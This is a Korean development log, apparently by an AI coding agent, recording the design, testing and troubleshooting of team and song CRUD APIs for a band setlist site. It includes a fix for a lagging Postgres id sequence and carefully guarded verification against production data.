- **"재검토 필요" 목록** — 곡 제목·가수가 실제로 바뀌면 상태가 `pending`으로 돌아가지만 **URL은 유지**된다(§15). 즉 **`youtube_url`이 있는데 `pending`인 곡**이 곧 재검토 대상이다. 이 목록을 보여 주는 화면이 없으면 교체된 곡에 이전 곡의 영상이 그대로 남는다. 현재 이 조합을 조회하는 API는 없다(`GET /teams/:teamId/songs`가 `youtubeUrl`과 `youtubeReviewStatus`를 함께 돌려주므로 화면에서 걸러낼 수는 있다)
- **썸네일 표시용 이미지 도메인** — `next.config.ts`의 `images.remotePatterns`는 `**.supabase.co`와 `is1-ssl.mzstatic.com` **둘뿐**이라 YouTube 썸네일은 `next/image`로 띄울 수 없다. 서버의 저장 allowlist(`youtube-search.constants.ts`의 `YOUTUBE_THUMBNAIL_ALLOWED_HOSTS`)는 게이트 2에서 실측한 **`i.ytimg.com` 하나뿐**이다(응답 150건 전부, 형태 `/vi/<id>/mqdefault.jpg` 등. 추측으로 넣었던 `img.youtube.com`은 제거했다). 남은 일은 **`next.config.ts`의 `remotePatterns`와 저장 allowlist를 같은 값으로 맞추는 것**이다(§13의 앨범 커버 allowlist와 같은 방침). 또는 `<img>`를 쓰면 `remotePatterns`를 건드리지 않아도 된다
- **쿼터 표시** — `GET /youtube/quota`가 오늘(태평양 시간) 사용량·상한 80·남은 횟수·**다음 리셋 시각**을 돌려준다. 배치 화면이 이 값을 보여 주지 않으면 배치가 중간에 멈춘 이유를 설명할 방법이 없다. 리셋은 태평양 시간 자정이라 한국 시간 기준 서머타임 중 **오후 4시**, 서머타임이 끝나면 오후 5시다(추정 — 표시할 때는 서버가 준 `resetsAt`을 그대로 변환한다)
- **배치 실행 UX** — 요청당 곡 수는 기본 5, 최대 10이고 곡당 최악 5초라 **응답이 최악 25~50초**까지 걸린다. 배포 플랫폼의 요청 타임아웃이 그보다 짧지 않은지 확인한다(플랫폼 미정). 응답의 `remainingTargets`로 "다시 실행" 버튼을 유지하고, `abortedBy`(`quota`/`api_key`/`consecutive_errors`)를 사람이 읽는 문장으로 바꿔 보여 준다. 두 번째 클릭은 `409`로 거부되므로 진행 중에는 버튼을 막는다
- **배치 중단 응답 (결정됨, §15)** — 관리자 UI는 세 가지를 다른 문장으로 보여 줘야 한다: `429`(헤더 `Retry-After`로 다음 시도 시각 안내, 아무것도 처리되지 않았음), `500`(서버 설정 문제이니 관리자에게 알리라는 안내, 응답에 키 관련 내용은 없다), `200`의 `abortedBy`(`quota`/`consecutive_errors` — 일부는 처리됐고 남은 대상이 있음)
- **30일 정리의 스케줄러가 없다** — `npm run youtube:cleanup`과 배치 시작 시에만 돈다. **배포 전에 크론(또는 플랫폼 스케줄)을 연결**한다. 정책 해석(30일 보관 제한)은 구현자의 것이며 법적 확인을 받지 않았으므로, 배포 전에 실제 적용 범위를 한 번 확인한다
- **YouTube API 키 제한과 로테이션** — 배치 키는 **API 제한 = YouTube Data API v3 하나만**을 권장한다(애플리케이션 제한은 배포 위치가 정해진 뒤 서버 IP로). 프론트 실시간 폴백(`src/app/api/youtube/top-video/route.ts`)은 키를 **URL 쿼리(`key=`)** 로 보낸다 — 구글 문서가 URL 스캔으로 도난될 수 있다고 경고하는 방식이라 헤더(`X-goog-api-key`)로 바꾸는 것을 프론트 수정 항목으로 검토한다. **[2026-09-22, §17: 폴백 라우트를 삭제해 `key=` 쿼리 전송 경로가 코드에서 사라졌다. 프론트용 키 폐기 여부는 §17 "배포 후 내가 할 일"]** 배치 키와 폴백 키는 **서로 다른 Cloud 프로젝트**의 것이어야 쿼터가 실제로 분리된다
- ~~**프론트 실시간 폴백 검토 (§15 게이트 2 발견)**~~ **[결정·완료 2026-09-22, §17: 제거(B안) — 영상 링크가 없는 곡은 "곡명 가수" 검색 결과 페이지를 새 탭으로 연다]** — `top-video/route.ts`는 이식 전 원본과 같은 점수로 1위를 고르는데, 승인된 5곡 기준으로 그 1위가 사람이 승인한 영상과 5/5 달랐다(표본 5곡, 다른 것이 곧 틀린 것은 아니다). 백엔드의 후보 선정은 원본 순서로 바꿨으므로 **방문자가 URL 없는 곡에서 만나는 폴백과 관리자 리뷰 후보가 서로 다른 기준**이 된다. 관리자가 59곡을 승인해 URL이 채워지면 폴백 호출 자체가 줄어들지만, 남는 곡을 위해 폴백의 선택 기준(원본 순서로의 전환 또는 제거)을 정한다. 근거 테스트는 `youtube-score.spec.ts`
- **`prd-admin.md` 정정 (완료, 2026-09-20)** — "배치용 API 키와 폴백용 API 키를 분리해 방문자 quota를 보호"는 **키를 나눠서는 성립하지 않는다**(쿼터는 Cloud 프로젝트 단위, §15 조사). "서로 다른 Cloud 프로젝트의 키를 쓴다"로 고치고 근거 문서 링크를 달았다
- **mutex·아웃바운드 상한은 단일 인스턴스 전제** **(2026-09-21: §16의 throttler 저장소도 인메모리라 같은 전제다 — 스케일아웃 시 셋을 함께 옮긴다)** — 배포가 둘 이상의 인스턴스가 되는 순간 일일 상한(80)과 iTunes 분당 상한(15)이 인스턴스 수만큼 늘어날 수 있다. 특히 일일 상한은 두 프로세스가 사용량 COUNT를 동시에 읽는 TOCTOU라 **곡 단위 부분 유니크 인덱스로는 막히지 않는다**(§15). 스케일아웃을 논의하는 시점에 공유 저장소 기반으로 둘을 함께 옮긴다
- **work03 대량 삽입 체크리스트에 추가** — 이미 있는 두 항목(시퀀스 재동기화, `youtube_url`이 있는 행을 `approved`로 갱신)에 더해 **`youtube_url` 형식 검증**(`https://www.youtube.com/watch?v=<11자>`, `videoseries`·`live_stream` 제외)을 추가한다. §15에서 형식 DB CHECK를 걸지 않기로 했으므로 삽입 쪽이 검증해야 한다

### 완료 상태 및 다음 단계

- 브랜치 `feature/auth-jwt-login` (`develop`에서 분기)
- **다음**: work02 빌드 순서 3단계 — Team CRUD(PRD F003~F006). 시작 시점에 BigInt 직렬화 방식을 전역 정책으로 확정해야 한다 → §11에서 완료

## 11. work02-3 — 팀(Line Up) CRUD: 조회/등록/수정/순서 재정렬 (2026-09-19)

- **날짜**: 2026-09-19
- **브랜치**: `feature/team-crud` (`develop`에서 분기. 분기 전 로컬 `develop`이 `origin/develop`과 동일한 `6c02b98`임을 확인 — 2단계 때처럼 뒤처져 있지 않았다)
- **관련 PR**: work02-3, `feat: 팀(Line Up) 조회/등록/수정/순서 재정렬 API 구현` (푸시/PR 생성은 보류)

### 배경

work02 빌드 순서 3단계, PRD `F003`(팀 목록 조회) / `F004`(팀 등록) / `F005`(팀 정보 수정) / `F006`(공연 순서 재정렬). §10에서 만든 전역 Guard 위에 올라가는 **첫 실사용 API**이고, §9에서 "3단계 시작 시점에 정한다"고 미뤄 둔 **BigInt 직렬화 정책**을 확정해야 하는 단계다.

팀 **삭제**는 만들지 않았다 — PRD가 MVP 스코프에서 제외했고(학기 단위 통째 갱신 전제, 오입력은 수정으로 대응), `Setlist.teamId` FK가 `ON DELETE NO ACTION`이라 곡이 딸린 팀은 DB가 애초에 삭제를 거부한다.

### 구현 전 조사에서 드러난 것 (설계를 바꾼 사실들)

코드를 쓰기 전에 스키마와 **실제 프로덕션 데이터**를 확인했고, 그 결과 초안 설계를 두 군데 바꿨다.

| 조사 항목 | 확인된 사실 | 설계에 미친 영향 |
| --- | --- | --- |
| `performanceOrder` 범위 | 전체 통틀어 1..15가 **아니라 일자별 1..N** (day1=1..7, day2=1..8) | 정렬 기준이 `day → performanceOrder`가 되고, **재정렬 단위가 일자별**로 바뀜. 초안의 "전역 순서 배열"은 데이터와 맞지 않아 폐기 |
| `day` 값 형태 | 날짜가 아니라 리터럴 `"day1"` / `"day2"` | DTO 검증을 `/^day[1-9]\d*$/`로 고정. 공개 프론트가 이 문자열을 그대로 비교하므로 "1일차" 같은 값이 들어가면 해당 팀이 화면에서 사라진다 |
| `performanceOrder` unique 제약 | **없음** (실제 DB 제약 전수 조회: PK 2개 + FK 1개가 전부, 인덱스도 PK뿐) | 재정렬 중간 상태 충돌이 없으므로 임시 오프셋 트릭 불필요. 설계 쟁점 하나가 통째로 사라짐 |
| `Setlist.teamId` | 스칼라가 아니라 **Prisma 관계**(`LineUp.songs` 역방향 포함), `onDelete: NoAction` | 4단계에서 `include`/`_count` 사용 가능. 삭제 미구현 결정과도 방향이 일치 |

### 작업 내용

**1) 엔드포인트 4개** (`src/teams/`, 전부 인증 필요 — `@Public()` 미사용)

| 메서드 | 경로 | 동작 |
| --- | --- | --- |
| `GET` | `/teams` | `day` → `performanceOrder` → `id` 순 정렬 (NULL은 뒤) |
| `POST` | `/teams` | 팀명 + 공연일자 + 공연순서 한 세트. 같은 일자에 순서가 겹치면 409 |
| `PATCH` | `/teams/reorder` | 해당 일자 **전체** 팀 id 순서 배열 → 서버가 인덱스로 1..N 부여 |
| `PATCH` | `/teams/:id` | 팀명·공연일자 개별 수정 |

`reorder`는 `:id`보다 **먼저 선언**해야 한다(Express 매칭 순서). 선언 순서가 뒤집히면 `reorder`가 id로 파싱돼 400이 나므로, 컨트롤러 주석 + 단위 테스트로 순서를 고정했다.

**2) 응답 계약 (`dto/team-response.ts`)** — `TeamResponse` 인터페이스 + `toTeamResponse` 매퍼. DB 컬럼명(`team_name`/`image_src`)은 Prisma `@map`이 이미 흡수했으므로 매퍼가 실제로 하는 일은 `BigInt` → `string` 변환 하나다.

**3) `ParseBigIntPipe` (`src/common/`)** — `:id`를 BigInt로 변환. `BigInt("reorder")`가 던지는 `SyntaxError`가 500으로 새지 않도록 형식·자릿수·int8 범위를 먼저 거른다. 같은 규칙이 재정렬 본문의 `teamIds`에도 필요해서 `parseBigIntId` 함수로 분리했다. 4단계에서 그대로 재사용한다.

**4) 재정렬 집합 검증** — 중복 id / 존재하지 않는 id / 다른 일자의 id / 누락(부분 목록) / 빈 배열을 전부 400으로 거부하고, 검증을 모두 통과한 뒤에야 `prisma.$transaction` 안에서 순차 갱신한다.

**5) `day` 이동 시 순서 재배치** — `day`가 **실제로 바뀔 때만** 대상 일자의 맨 뒤(`max+1`)로 보낸다. 같은 `day`를 그대로 보내면 재배치하지 않는다(no-op). `max+1` 조회와 갱신은 같은 트랜잭션 안에 있다.

### 기술 판단

| 쟁점 | 선택 | 이유 |
| --- | --- | --- |
| **BigInt 직렬화** (§9/§10 이월 항목 확정) | **응답 매퍼 + 응답 타입 선언** (전역 인터셉터 ✗, `BigInt.prototype.toJSON` 패치 ✗) | 매퍼를 쓰면 **타입 자체가 API 계약**이 된다 — 컨트롤러 반환 타입만 보고 클라이언트가 받는 모양을 알 수 있다. 인터셉터는 "빠뜨릴 수 없다"는 장점이 있지만 서비스가 `{id: bigint}`를 반환한다고 선언해 놓고 실제로는 `string`이 나가서 **타입이 계약을 설명하지 못한다**. 매퍼를 빠뜨렸을 때의 실패는 `JSON.stringify` 예외 → 즉시 500이라 조용히 새지 않는다. 검토 당시 "컬럼명 매핑도 어차피 응답 경계에서 하니까"를 근거로 들었는데, 확인해 보니 **컬럼명은 Prisma `@map`이 이미 처리**하고 있어서 그 근거는 성립하지 않았다 — 순수하게 위 이유로 선택 |
| **재정렬 요청 형식** | **`{ day, teamIds[] }`** (`{id, performanceOrder}[]` ✗) | 서버가 배열 인덱스로 1..N을 부여해 **"연속·중복 없음" 불변식을 서버가 소유**한다. 클라이언트가 숫자를 계산해 보내면 `{1,2,2,5}` 같은 값이 올 수 있어 어차피 서버가 전부 재검증해야 한다 — 검증 코드는 같은데 사고 여지만 는다. 드래그 UI가 그대로 내놓는 모양이기도 하다 |
| **부분 목록 허용 여부** | **불허 — 일자 전체 집합과 정확히 일치해야 통과** | 빠진 팀의 순서값이 그대로 남아 1..N 연속성이 깨진다. "존재하지 않는 id"도 404가 아니라 400으로 처리했다 — 이 요청의 본질은 단일 자원 지목이 아니라 **본문 전체가 집합으로서 유효한가**이고, 부분 404를 섞으면 클라이언트가 분기할 이유가 없다 |
| **`(day, performanceOrder)` DB unique 제약** | **추가하지 않음** | 일반 unique 인덱스를 걸면 순서를 맞바꾸는 **중간 상태가 즉시 위반**이라 `DEFERRABLE` 제약이 필요한데 Prisma가 이를 모델링하지 못한다. 불변식은 애플리케이션(트랜잭션 + 집합 검증)이 보장하고, 대신 아래 "남겨둔 레이스"를 명시해 둔다 |
| **등록 시 순서 중복** | **409로 거부** (뒤로 밀기 ✗, 중복 허용 ✗) | 순서 변경에는 전용 엔드포인트가 이미 있다. 등록이 *다른 팀의 순서까지* 건드리는 두 번째 경로가 되면 "왜 저 팀이 밀렸는지"를 추적할 수 없다. 중복 허용은 정렬을 비결정적으로 만들어 공개 페이지 노출 순서가 흔들린다 |
| **`day` 변경 시 순서** | **대상 일자의 맨 뒤로 자동 이동** (충돌 시 409 ✗) | 일자를 옮기는 순간 기존 순서값은 의미를 잃는다(대상 일자에 같은 번호가 이미 있을 수 있음). 맨 뒤 배치가 유일하게 놀랍지 않은 선택이고, "먼저 재정렬하고 다시 오세요"라는 2단계 강요를 피한다. 원래 일자에 생기는 **번호 공백은 정렬에 무해**하며 다음 재정렬이 1..N으로 자동 복구한다. `performanceOrder`를 클라이언트가 직접 지정하는 것은 여전히 금지(`forbidNonWhitelisted` → 400)이고, **서버 주도 재배치만 예외**다 |
| **응답 필드명** | **PRD 개념명** (`teamName`, `cardImageUrl` 등) | Prisma 모델이 이미 그 이름을 쓰고 있어 추가 비용이 0. `cardImageUrl`은 F007(5단계) 전까지 **읽기 전용**으로만 응답에 포함하고 입력 DTO에는 넣지 않는다 |
| **Prisma 에러 매핑** | `P2025` → 404, `P2002` → 409 | `P2025`는 정상 경로에서 발생하지 않지만(갱신 직전에 존재 확인) API 밖에서 행이 사라졌을 때 500으로 새는 것을 막는다. **`P2002`는 "도달 불가"로 판단했다가 런타임 검증에서 실제로 터졌다** — 아래 트러블슈팅 1번 참조 |
| **DTO 검증 위치** | class-validator + 전역 `ValidationPipe` 재사용 | §10에서 이미 `whitelist`/`forbidNonWhitelisted`/`stopAtFirstError`를 걸어 둔 덕분에 이 단계에서 추가 설정이 필요 없었다. `stopAtFirstError` 때문에 데코레이터를 역순(맨 아래가 먼저 보고됨)으로 선언하는 2단계 컨벤션을 그대로 따랐다 |

### 검증

**단위 테스트 78개** (`npm test`, 2단계 17개 + 이번 61개). 2단계와 같이 `PrismaService`만 대역으로 두되, 호출 여부만 보는 대신 **작은 인메모리 저장소로 동작까지 흉내 내서** 순서 부여·집합 검증을 실제로 검증했다.

- `findAll`: 정렬 인자, id 문자열화, 응답 전체의 JSON 직렬화 가능 여부
- `create`: 정상 등록 / 순서 중복 409(그리고 **`create`가 호출되지 않음**) / 다른 일자의 같은 번호는 허용 / `P2002` → 409
- `update`: 404 / 빈 본문 400(트랜잭션을 열지도 않음) / 팀명만 수정 시 순서·일자 불변 / **id를 건드리지 않음**(FK 보호) / `day` 변경 시 맨 뒤 / 같은 `day`는 no-op
- `reorder`: 1..N 부여 / 다른 일자 불간섭 / 누락·타 일자 id·중복 id·비숫자 id 거부 / 거부 시 **`update`가 한 번도 호출되지 않음** / 트랜잭션 1회 + `update` N회
- 컨트롤러: **4개 핸들러와 클래스에 `isPublic` 메타데이터가 없음**(`@Public()` 오부착 방지), `reorder` 선언이 `:id`보다 앞임, 경로·메서드 메타데이터
- DTO: 전역 파이프와 **동일한 옵션**으로 재현해 공백 trim, 빈 문자열 거부, `day` 형식, int2 상한(32768 거부), 미선언 필드 거부

**런타임 검증 80개 체크, 실패 0** (`node dist/main.js`, 포트 3002 — 1단계 때처럼 3001을 다른 프로세스가 잡고 있을 때 404로 오인하는 것을 피하려고 분리).

| 구간 | 내용 | 결과 |
| --- | --- | --- |
| A1 | 4개 엔드포인트 × (토큰 없음 / 위조 서명 / 만료 / Bearer 아님) | 전부 `401 인증이 필요합니다.` |
| A1 | `GET /health` | `200` — 공개 유지 (회귀 없음) |
| A3 | POST DTO 거부 10종 | 전부 `400` |
| A4 | `:id` 파싱(`abc`/`0`/`-1`/int8 초과), 없는 id, 빈 본문, `performanceOrder` 주입 | `400` ×6, `404` ×1 |
| A5 | 재정렬 거부 8종(빈 배열/형식/중복/부분/타 일자/미지의 일자) | 전부 `400`, **직후 스냅샷 diff 0** |
| A6 | 실제 `day1`/`day2` **현재 순서 그대로 전송(무변경)** | `200`, 응답이 시작 시점과 **바이트 단위 동일** |
| B | 임시 일자(`day98`/`day99`) 임시 팀 4건으로 등록·중복 409·수정·재정렬·swap·일자 이동·no-op·공백 복구 | 전부 기대값 일치 |
| C | 임시 행 삭제 후 복구 확인 | 15행 / `Setlist` 64행 / `teamId` 매칭 **64/64** / 순서 시그니처 무변경 / `GET /teams` 스냅샷 **바이트 단위 동일** |

**프로덕션 데이터 보호 절차** (별도 테스트 DB가 없어 프로덕션에 직접 검증했다)

- **쓰기가 없는 거부 케이스를 전부 먼저** 실행하고, 그 직후 스냅샷 diff가 0인지 확인한 뒤에 쓰기 구간으로 넘어갔다
- 실제 `day1`/`day2` 행에는 **swap을 하지 않았다**. "현재 순서 그대로 전송" 무변경 검증만 수행
- 임시 팀은 실제 일자와 섞이지 않도록 **`day98`/`day99`** 를 사용하고 팀명을 `__verify_*`로 고정. 임시 팀에는 **곡(`Setlist`)을 절대 만들지 않았고**, 정리 스크립트가 삭제 전에 그 사실을 다시 확인한다
- 임시 행 생성부터 삭제까지를 `try/finally`로 묶어 중간 실패와 무관하게 정리되도록 했다. **실제 노출 창은 1초**
- 스냅샷은 레포 바깥(세션 스크래치패드)에 저장했다 — `.gitignore`에 의존하지 않는 쪽이 확실하다
- **시퀀스는 되돌리지 않았다.** 임시 팀이 소비한 id는 **16~19**이며, 되감으면 향후 id 재사용 위험이 생긴다. 현재 `Line Up` 시퀀스는 19에 있고 다음 팀은 20번부터 시작한다

**회귀 없음** — 루트 `npm run build`(Next.js 프로덕션 빌드) / `npm run lint`, `apps/api` `npm run build` / `npm run lint` 모두 정상.

**엔드투엔드 로그인은 이번에도 미수행** — 관리자 비밀번호를 주고받지 않는다는 원칙에 따라, Guard 검증에는 `JWT_SECRET`으로 **로컬에서 직접 서명한 토큰**을 사용했다. 서명·검증 경로는 서버가 쓰는 것과 동일하지만, `POST /auth/login`을 통과하는 실제 자격증명 경로는 §10과 마찬가지로 사용자 몫으로 남아 있다.

### 트러블슈팅 기록

**1) `POST /teams`가 프로덕션에서 500 — id 시퀀스가 실제 데이터보다 뒤처져 있었다**

런타임 검증 첫 실행에서 A/P 구간(인증·검증·조회)은 전부 통과했는데 **쓰기가 5건 모두 500**이었다. 서버 로그의 실제 에러는 다음과 같다.

```
PrismaClientKnownRequestError: Unique constraint failed on the constraint: `setlist_pkey`
code: 'P2002' → originalMessage: 'duplicate key value violates unique constraint "setlist_pkey"'
```

원인을 단정하지 않고 시퀀스 상태를 직접 조회했다.

| 테이블 | `max(id)` | 시퀀스 `last_value` | `is_called` | 다음 `nextval` |
| --- | --- | --- | --- | --- |
| `Line Up` | 15 | 7 | true | **8 → 이미 존재** |
| `Setlist` | 64 | 1 | **false** | **1 → 이미 존재** |
| `AdminUser` | 1 | 1 | true | 2 (정상) |

기존 행(`Line Up` 1~15, `Setlist` 1~64)이 Supabase 콘솔/CSV로 **id를 명시해서** 들어가 `BIGSERIAL` 시퀀스가 함께 전진하지 않은 것이다. `AdminUser`만 멀쩡한 것이 이 진단의 대조군이다 — 그것만 Prisma로 삽입했다.

**이건 이번 단계만의 문제가 아니었다.** `Setlist` 시퀀스는 `is_called=false`, 즉 한 번도 호출된 적이 없어서 **4단계(곡 등록)도 첫 삽입부터 똑같이 실패**했을 상황이었다. 마이그레이션 `20260919210000_resync_id_sequences`로 두 시퀀스를 함께 교정했다.

```sql
SELECT setval(pg_get_serial_sequence('"Line Up"', 'id'),
              COALESCE(MAX(id), 1), MAX(id) IS NOT NULL) FROM "Line Up";
```

- 시퀀스 이름을 직접 쓰지 않고 `pg_get_serial_sequence`로 찾는다 — `Line Up`의 시퀀스 이름은 `setlist_id_seq`다(PK 이름이 `setlist_pkey`인 것과 같은, 테이블 개명의 흔적). 적용 전에 두 테이블 모두 이 함수가 **NULL이 아닌** 값을 돌려주는지 확인했다. `setval`의 첫 인자가 NULL이면 에러 없이 조용히 넘어가기 때문이다
- **행은 전혀 건드리지 않는다.** 시퀀스 위치만 앞으로 옮기므로 이미 쓰인 id가 재사용될 위험도 없다
- §9와 같은 이유로 `migrate dev`가 아니라 **`prisma migrate deploy`** 로 적용했다
- 적용 후 확인: `Line Up` 15/true, `Setlist` 64/true, 행 수 15·64, `teamId` 매칭 64/64, 순서 시그니처 무변경

**부수적으로 확인한 것**: 재실행에서 시퀀스가 15 → 19로 **정확히 등록 성공 횟수(4)만큼** 전진했다. 즉 **INSERT 이전에 거부되는 409(순서 중복)는 `nextval`을 소비하지 않는다.** 반대로 첫 실행에서는 한 행도 생성되지 않았는데 시퀀스가 움직였는데, 이는 "실패한 INSERT도 `nextval`을 소비한다"는 Postgres 동작(시퀀스는 비트랜잭션적)과 일치한다. 다만 **첫 실행 직전 값을 측정해 두지 않았으므로** 이 부분은 정황 일치이지 직접 확인은 아니다.

**2) "`P2002`는 도달 불가"라는 판단을 정정함**

설계 단계에서 "`Line Up`의 unique 인덱스는 PK뿐이므로 `P2002`는 도달할 수 없는 분기이고, 미리 처리하는 것은 과설계"라고 판단하고 `P2025`만 매핑했다. **틀렸다.** PK 자체가 unique 제약이고, 위 1번처럼 시퀀스가 뒤처지면 바로 그 경로로 터진다. "제약 목록을 봤다"는 것과 "그 제약이 위반될 경로가 없다"는 것을 같은 것으로 취급한 판단 오류였다.

교정: `mapUniqueViolation`을 추가해 `P2002` → 409로 매핑하고, 회귀 테스트를 넣었다. 메시지는 **사용자 입력 오류로 읽히지 않도록** 원인을 명시한다 — 같은 409라도 "순서 중복"(입력 문제)과 "id 발급 충돌"(서버 데이터 정합성 문제)은 대응이 완전히 다르기 때문이다.

> `day1의 2번 순서는 이미 '뉴비' 팀이 사용 중입니다.` (입력 문제)
> `서버 측 id 발급이 충돌해 팀을 등록하지 못했습니다. 입력값 문제가 아니며, id 시퀀스 재동기화가 필요할 수 있습니다.` (서버 문제)

**3) "임시 행은 공개 프론트에 렌더링되지 않는다"는 발언을 정정함**

임시 팀이 공개 페이지에 영향을 주는지 확인하면서, 처음에는 `src/app/setlist/page.tsx`의 `getDayFromRow`가 알 수 없는 `day`에 `null`을 반환하는 것만 보고 "공개 프론트는 이 값을 렌더링하지 않는다"고 단정했다. **`event-goods/page.tsx`에 별도 복사본이 있고 그 폴백에는 상한이 없다**(`id >= 8 → day2`)는 것을 확인하지 않은 추측이었다.

실제로는 임시 팀이 `/event-goods`의 **2일차 데이터에 포함된다**. 화면에 보이지 않는 이유는 `event-goods-view.tsx`가 `tracks.length > 0`인 팀만 렌더링하기 때문인데, 이는 임시 팀에 곡이 없어서 **우연히** 안전했던 것이다(서버 → 클라이언트 페이로드에는 들어간다). 이 사실을 보고하고 승인을 받은 뒤 쓰기 검증을 진행했고, 폴백 자체의 정리는 §10 "7단계 배포 전 확인 항목"에 기록했다.

> **보충 (2026-09-20, §13 조사)**: 위 서술은 그대로 유효하다. 다만 **팀 이미지 폴백(`getImageFallbackPath`)은 화면에 도달하지 않는다** — 노출되는 것은 팀명과 곡 목록뿐이다. 근거와 경위는 §10의 정정 블록 참조.

**교훈**: 같은 로직의 복사본이 두 파일에 있으면 한쪽만 읽고 일반화하면 안 된다. 그리고 "확인했다"와 "그럴 것이다"를 보고 단계에서 구분해서 적어야, 상대가 검증 여부를 판단할 수 있다.

### 이 단계에서 의도적으로 하지 않은 것

- **팀 삭제 API** — PRD MVP 제외. 학기 단위 통째 갱신 전제이고 오입력은 수정으로 대응한다. FK가 `NO ACTION`이라 곡이 딸린 팀은 DB도 삭제를 막는다
- **카드뉴스 이미지 업로드(F007)** — 5단계. `image_src`는 `cardImageUrl`로 **읽기 전용 응답**에만 포함하고, 입력 DTO에는 넣지 않았다(보내면 400)
- **Setlist(곡) API** — 4단계. 이번에 만든 `ParseBigIntPipe`·응답 매퍼 패턴·Prisma 에러 매핑을 그대로 재사용하면 된다
- **로그인 시도 제한(`@nestjs/throttler`) / CORS** — §10의 판단 유지. 둘 다 **7단계(배포/관리자 프론트) 전 선행 항목**이며 지금 열어 둘 이유가 없다
- **`songCount` 같은 파생 필드** — PRD F003은 목록 조회까지다. 필요해지면 4단계에서 `_count`로 붙인다
- **`(day, performanceOrder)` DB 제약 추가** — 위 기술 판단 표 참조
- **`/event-goods` id 범위 폴백 수정** — 프론트 스코프. §10 "7단계 배포 전 확인 항목"에 기록만 했다

### 남겨둔 결정 (4단계 이후로 이월)

- **`day` 문자열 정렬** — `day`가 문자열이라 `day10`이 `day2`보다 앞에 온다. 현재 `day1`/`day2`뿐이라 그대로 뒀다. 3일차 이상으로 늘어나거나 `day10`이 생기는 시점에 (a) 정렬용 숫자 컬럼 분리 또는 (b) 별도 `Day` 테이블로 정규화를 검토한다
- **등록 시 남아 있는 레이스** — `(day, performanceOrder)`에 unique 제약이 없어서, 중복 확인과 INSERT를 한 트랜잭션에 묶어도 동시 요청 경쟁이 **완전히 닫히지는 않는다**. 관리자 1인 전제라 수용했다. 관리자가 여러 명이 되면 DB 제약(`DEFERRABLE` 포함)을 다시 검토해야 한다
- **`Setlist.youtubeReviewStatus` 컬럼** — §9·§10에 이어 계속 보류(4단계)
- **BigInt 매퍼의 반복 비용** — 모델마다 매퍼를 하나씩 쓰는 방식이라 4~6단계에서 반복이 쌓인다. 부담스러워지는 시점(6단계쯤)에 인터셉터 방식을 다시 판단한다
- **work03 대량 마이그레이션 시 시퀀스 재동기화** — 2학기 콘텐츠를 **id를 명시해서** 넣으면 위 트러블슈팅 1번과 똑같은 상황이 재현된다. 대량 삽입 뒤에는 반드시 `setval(pg_get_serial_sequence(...), MAX(id))`로 시퀀스를 다시 맞출 것. 가능하면 애초에 id를 명시하지 않고 삽입하는 쪽이 낫다

## 12. work02-4 — 곡(Setlist) 팀별 조회/등록/수정 (2026-09-19)

- **날짜**: 2026-09-19
- **브랜치**: `feature/setlist-crud` (`develop`과 같은 커밋 `6822b05`에 있던 작업 브랜치를 `git branch -m`으로 개명. 분기 시점에 로컬 `develop`이 `origin/develop`과 동일함을 확인)
- **관련 PR**: work02-4, `feat: 곡(Setlist) 팀별 조회/등록/수정 API 구현` (푸시/PR 생성은 보류)

### 배경

work02 빌드 순서 4단계, PRD `F008`(팀별 곡 조회) / `F009`(곡 등록·수정). §11에서 만든 `ParseBigIntPipe`·응답 매퍼·Prisma 에러 매핑을 그대로 얹는 단계이고, 관리자 페이지의 "팀 선택 → 곡 패널" 흐름에서 **팀 다음으로 오는 실사용 API**다.

곡 **삭제**는 만들지 않았다 — PRD가 MVP 스코프에서 제외했고, 학기 단위 통째 갱신 전제라 오입력은 수정으로 대응한다.

### 구현 전 조사에서 드러난 것 (설계를 바꾼 사실들)

| 조사 항목 | 확인된 사실 | 설계에 미친 영향 |
| --- | --- | --- |
| 곡 정렬 기준 | `Setlist`에 순서 컬럼이 **없고**, 공개 프론트가 `.order("id", asc)`로 읽어 그대로 렌더링한다(`src/lib/fetch-line-up-and-setlist.ts`). 실데이터도 팀별 id가 완전히 연속(1~4=팀1 … 59~64=팀15) | 조회 정렬을 `id` asc로 고정. **새 곡은 항상 맨 뒤에 붙고 중간 삽입이 불가능**하다는 한계가 확정됨 |
| 공개 프론트의 중복 처리 | 두 페이지 모두 `title + artist`가 같은 뒤 행을 **조용히 버린다**. 비교 범위는 `tracksByTeamId[teamId]` 안, 즉 **팀 내부 한정**(`setlist/page.tsx:297`, `event-goods/page.tsx:143`) | 중복을 허용하면 "관리자엔 보이는데 사이트엔 안 나오는 곡"이 생긴다 → **409 거부**로 확정. 판정 범위도 팀 내부로 맞춤 |
| `singer` 실제 상태 | 컬럼은 nullable인데 **64행 전부 값이 있고** 공백·빈 문자열도 0건. 비면 공개 페이지가 `"SUMMIT Band"`로 대체 표시 | 등록 시 **필수**로 확정. 이 API로 NULL로 되돌리는 경로는 두지 않음 |
| `albumCoverUrl` / `youtubeUrl` 분포 | 앨범 커버는 **64/64 채워짐**, 유튜브는 **5건뿐**(59건 NULL) | 수정 시 초기화 여부 판단의 근거. 커버는 F010으로 다시 받으면 되지만 승인된 링크 5건은 복구 비용이 크다 → **유지** |
| 길이·공백 위생 | title 최대 24자 / singer 최대 21자, 앞뒤 공백·빈 문자열 0건, 같은 팀 내 중복 0건(전역으로 넓혀도 0건) | 상한 200/100이 **기존 64행을 전혀 막지 않음**을 실측으로 확인. 새 검증 규칙 때문에 기존 행의 PATCH가 실패하는 경우 없음 |
| `Setlist` 시퀀스 | `Setlist_id_seq` = 64, `max(id)` = 64 → 다음 65 (§11 마이그레이션 이후 정상) | 쓰기 검증 전 교정 불필요 |
| DB 제약 | `Setlist`의 unique 인덱스는 PK뿐. `(teamId, title, singer)` 제약 없음. `teamId`에 인덱스도 없음(64행이라 성능 무관) | 중복 방지를 DB가 해 주지 않으므로 **애플리케이션이 불변식을 소유**해야 함 → 아래 행 잠금 |
| `event-goods` 폴백 상한 | §11에서 기록한 `id >= 8 → day2`(상한 없음)가 **develop에 아직 미반영** | 쓰기 검증 게이트 발동 — 곡 생성 전에 노출 경로를 보고하고 승인받음 |

### 작업 내용

**1) 엔드포인트 3개** (`src/songs/`, 전부 인증 필요 — `@Public()` 미사용)

| 메서드 | 경로 | 동작 |
| --- | --- | --- |
| `GET` | `/teams/:teamId/songs` | 해당 팀의 곡을 `id` asc로 조회. 없는 팀은 404 |
| `POST` | `/teams/:teamId/songs` | `{ title, singer }`. 같은 팀에 같은 곡이 있으면 409 |
| `PATCH` | `/songs/:id` | `{ title?, singer? }` (최소 1개). 수정 후 값 기준 중복 검사 |

